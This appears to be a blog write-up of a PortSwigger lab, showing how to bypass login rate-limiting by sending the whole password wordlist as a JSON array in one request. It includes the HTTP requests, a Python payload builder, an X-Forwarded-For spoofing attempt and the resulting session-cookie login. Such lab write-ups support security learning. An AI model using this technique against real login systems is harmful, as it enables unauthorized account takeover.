+++
date = '2026-02-18T18:28:15Z'
draft = false
title = 'Broken Brute Force Multiple Credentials'
categories = ["PortSwigger", "Web Security"]
tags = ["SSPP", "Injections"]
[cover]
    image = "brute_force_multiple_credentials.png" 
    alt = "Eagle Image"
    relative = true

+++

## Objective

Exploit a logic flaw in the application's brute-force protection to determine the password for the user `carlos` and access their account page.

---

## Target Information

* **Victim Username:** `carlos`
* **Candidate Passwords:** [Provided Wordlist]
* **Vulnerability:** Logic flaw in login rate-limiting/brute-force protection.

---

## Success Criteria

* Identify the correct password for `carlos`.
* Successfully log in and access the `/my-account` page.

---

## Steps

lets try exploring how the login functionality works here by sending a normal request like this:
```http
POST /login HTTP/2
--------

{"username": "carlos", "password": "test"}

```

after 3 failed attempts we get this error:
`<p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>`

lets try a very simple ip spoofing by adding the X-Forwarded-For header to our request like this:

```http
POST /login HTTP/2
X-Forwarded-For: 192.168.1.2

{"username": "carlos", "password": "test"}

```

this didnt work the error still appear

we can try 3 passwords then waiting 60 sec and try other 3 passowrds untill we complete the list of passwords but this is not what the Lab intending from us

The lab title contains a big hint saying multiple credentials per request, since we have the victim correct username this hint may mentions the password parameter in the json payload

`{"username": "carlos", "password": "test"}`

you may think doing this:

```json
{
    "username": "carlos", 
    "password": "test",
    "password": "anotherpassword"
}

```

to include multiple passwords but this is not how json handles parameters, another useful way is to use an array of passwords which json can handle like this for example:

```json
{
    "username": "carlos", 
    "password": ["pass1", "pass2"]
}

```

sending this request:

```http
POST /login HTTP/2
----------------
{
    "username": "carlos", 
    "password": ["pass1", "pass2"]
}

```

the server acctually handle it well without any json format error
so lets construct an array including all the passwords to test them in one time using python:

```python
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines() # this gives us a list of the passwords
    # constructing the payload 
    carlos_payload = {
        "username": "carlos",
        "password": passwords
    }
    # as the server only accepts double quotes we should dumps this payload
    json_payload = json.dumps(carlos_payload)
    print(json_payload) # copy the result printed and put it in the burp repeater request

```

the request should look like this:

```http
POST /login HTTP/2

{
   "username":"carlos",
   "password":[
      "123456",
      "password",
      "12345678",
      "qwerty",
      "123456789",
      "12345",
      "......"
   ]
}

```

by sending the request the server responds with:

```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=bty3duc8PQFUdbRLnPJdkGN8iuqpzxES; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

copy the session token and send a request to the /my-account route with the token we just got like this:

```http
GET /my-account HTTP/2
Host: 0a1200ae045f6a43818dbb540043002d.web-security-academy.net
Cookie: session=bty3duc8PQFUdbRLnPJdkGN8iuqpzxES
.....

```

**Congratulations, you solved the lab!**

---

### Quick recap on how could the server handle the password parmaeter in the json payload

**python version:**

```python
for password in request.json["password"]:
    if login(request.json["username"], password):
        response = redirect(f"/my-account?id={request.json['username']}")
        response.set_cookie('session', 'bty3duc8PQFUdbRLnPJdkGN8iuqpzxES', secure=True, httponly=True, samesite='None')
        return response
return {"error": "Invalid username or password."}

```

> **Note:**
> GraphQL is The Real-World King of this Bug due to its features
